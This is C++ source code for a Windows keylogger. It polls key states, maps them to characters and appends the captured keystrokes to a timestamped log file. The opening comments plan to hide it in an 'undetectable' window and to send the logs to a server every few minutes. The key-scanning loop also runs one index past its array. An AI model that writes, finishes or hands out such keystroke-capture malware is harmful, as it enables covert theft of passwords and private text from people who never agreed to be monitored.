// Bug 1: backspace eats into input like (Ctrl), resulting in (Ct
// Possibly fix this by replacing (Ctrl) with a special character that then gets changed to (Ctrl) before writing to the file, also with (Tab) etc.

// Bug 2: if a key is held down it only detects the input once

// Keys to add: ,< .> -_ =+ \| `¬, all numpad keys, arrow keys, windows key, F1-F12 keys, delete key

// Future features
// Make it run in an invisible, undetectable window like a real keylogger
// Make it send all the information to a server I set up, possibly every 5 minutes or so
// Recode program to be more compartmentalised

#include <fstream> // Write to file
#include <windows.h> // Get key presses
#include <time.h> // Get current time
#include <string>


class vkey {
public:
	bool is_down;
	std::string lower_case;
	std::string upper_case;
	int vk_state;

	bool is_pressed() {
		return GetAsyncKeyState(vk_state);
	}

	std::string buffer_output(bool shift_down) {
		if (!shift_down || upper_case.empty()) return lower_case;
		else return upper_case;
	}

	vkey() { // Default constructor
		is_down = false; // Tracks whether button was down in previous iteration of main loop
		lower_case = "";
		upper_case = "";
		vk_state = 0;
	}	
	vkey(std::string s1, std::string s2, int i1) { // Constructor for case sensitive keys
		is_down = false;
		lower_case = s1;
		upper_case = s2;
		vk_state = i1;
	}	
	vkey(std::string s1, int i1) { // Constructor for case insensitive keys
		is_down = false;
		lower_case = s1;
		upper_case = ""; // Saves memory compared to setting it to s1
		vk_state = i1;
	}
};

int main() {
	const int KEY_RANGE = 46; // Set to 1 higher than number of keys initialised
	const int BUFFER_DUMP_LENGTH = 100;
	const std::string character_list = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)!\"$£%^&*(";
	vkey vkey_list[KEY_RANGE];
	for (int i = 0; i < 36; i++) { // Create letters and numbers. Clean this code up later, it needlessly converts between chars and strings
		char c = character_list[i]; // Get ith character from string
		if (i <= 25) vkey_list[i] = vkey(std::string(1,tolower(c)), std::string(1, c), int(c)); // If we're writing a letter
		else vkey_list[i] = vkey(std::string(1, c), std::string(1,character_list[i+10]),int(c)); // If we're writing a number
	}
	vkey_list[36] = vkey(" ", VK_SPACE);
	vkey_list[37] = vkey("\n", VK_RETURN);
	vkey_list[38] = vkey("(Backspace)", VK_BACK);
	vkey_list[39] = vkey("(Tab)", VK_TAB);
	vkey_list[40] = vkey("(Ctrl)", VK_CONTROL);
	vkey_list[41] = vkey("(Alt)", VK_MENU);
	vkey_list[42] = vkey("", VK_SHIFT);
	vkey_list[43] = vkey(";", ":", VK_OEM_1);
	vkey_list[44] = vkey("/", "?", VK_OEM_2);
	vkey_list[45] = vkey("'", "@", VK_OEM_3);
	time_t cur_time;
	time(&cur_time);
	std::string cur_time_string = std::to_string(cur_time);
	std::string buffer = "";
	while (1) {
		if (GetAsyncKeyState(VK_ESCAPE)) { // Terminate program when escape is pressed
			// Fix memory leak later
			break;
		}
		// Loop through keys
		for (int i = 0; i <= KEY_RANGE; i++) {
			if (vkey_list[i].is_pressed()) {
				if (!vkey_list[i].is_down) {
					buffer.append(vkey_list[i].buffer_output(GetAsyncKeyState(VK_SHIFT)));
					//if (vkey_list[i].vk_state == VK_BACK && !buffer.empty()) buffer.pop_back();
				}
				vkey_list[i].is_down = true;
			}
			else vkey_list[i].is_down = false;
		}
		// Write output to file when buffer string is long enough, or tab is pressed
		if (buffer.length() >= BUFFER_DUMP_LENGTH || (GetAsyncKeyState(VK_TAB) && buffer.length() > 0)) {
			std::ofstream log_file("keylog" + cur_time_string + ".txt", std::ios::out | std::ios::app);
			if (log_file.is_open()) {
				log_file << buffer;
				log_file.close();
			}
			buffer = "";
		}
		Sleep(10);
	}
	return 0;
}